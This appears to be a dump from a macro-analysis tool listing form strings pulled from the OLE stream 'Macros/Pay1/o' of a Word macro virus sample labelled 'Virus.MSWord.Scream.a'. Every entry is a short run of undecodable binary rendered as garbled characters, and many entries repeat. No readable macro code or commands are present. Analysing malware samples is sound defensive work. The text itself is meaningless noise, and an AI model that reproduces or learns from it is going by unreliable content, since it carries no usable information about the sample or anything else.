VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ȝ l�;��ʮt�y�<r���F#c���)h8ωaH��il��o#��k���xv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���zJ�i���9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4CTAc��Bd��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����#�5T���)Ʀ|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M��8(a�6I��[h����"��]�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�$�Fw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��VbeD�ۥ��<{�	��Xc5�ꌵR<p�q)	$�����+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǹ� �(@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V;�r�^�����������=yL�8 �I��0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�=�'<7O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=;�51�x��N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/-曀<��v����JD�� qZ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�BZ�K�J�4�u�crx�FS&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�G�w��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}��Hၧ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���VVǉ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/h��V-ƪz���� lq;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#��V�^#ź�E�,��A��.|���> �]]u���R��d�e>j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t��o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�VLe���Y3K�]��p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�x���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ٯ_�-�־�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��>~?r�_9�k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŏ�jO��ܩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��N��/��8�m�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5R+om�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5R"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�J���X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1�H��{�mL�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kw� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�R�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�(��"���=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]�F��J�ᓢ�dm�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a�G;-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Utf���i�����W=��*-W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ga�X�Z�P��iŊ����Î\R'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ǉ�z��p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�R��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�F�w�x��N�D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�7��G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��᠗�/����a�9]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n�-{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6;�qi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�29�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�؃f~N8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n����ԝ�Ӛj�/gH&�H�s��i>c��A�xpo`+{fwF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O#H~0�ҳy���@�p�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����c��v��ؒ���9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h��H�6@�|@�%}Ʋ
�>�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kv̴L��Z��L�צ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�*CQ-҆
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�|� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Uw��UO$���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jdq��55
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(+����f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LN�Ws
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ٯ_�-�־�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��>~?r�_9�k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŏ�jO��ܩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��N��/��8�m�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5R+om�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5R"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�J���X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m��7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1їGAX�ޡ]���?E �dΏ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%@��a�#�6'���SN�1��f7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��e׷C\�ox.�B�uu���I,uN�%d}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��A�>��ڗFW��Q�����,�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��Oj��{��ԷvX$,=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ѣf8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o�l0>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���h��o4?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���H�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w0��[s�3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ɠ�a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t��ֻ�N?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�-ԇ��>4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*���Y$Nn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Փ8c����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���I'a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�G�����"!�{�$�pc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S\�zM��W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4���.S��J��S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Orǐ%wb{n���Zb����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����G"@�<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I9����hh�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x)��*)-���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�z�J��R����x�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9)��Nqq�^r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�^���[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,u[R|�~�H�s�ׯ�?���_F=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R$}���1�_��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z��> }�j�V��z��> }�j�D4ߐ�����B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/q������j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V��S��l1V?-wb�:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)=̽��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�,ֽ_@٨7[x�0#�ǶZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��<*f����]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|nk�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U3Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ލ5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ʶ�. r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!��0�uV_p5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d����U��9�@��HÖ<w���kE��5-8��Ł��2O�@7q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���pZS����])�۾��\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bD��&���p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	��4l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��cȔK[�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%��K�=��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D�i��Y#�h��9�ܓ�h����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�
�{���=�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ň�N�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���ں
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J{[\���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӳ�����y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*����n�m��M�J6�x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�]�Owi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�|mt�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ú��s�%#)��rt�;�ʎ���$�B�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ٯ_�-�־�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��>~?r�_9�k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŏ�jO��ܩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��N��/��8�m�H�
-------------------------------------------------------------------------------
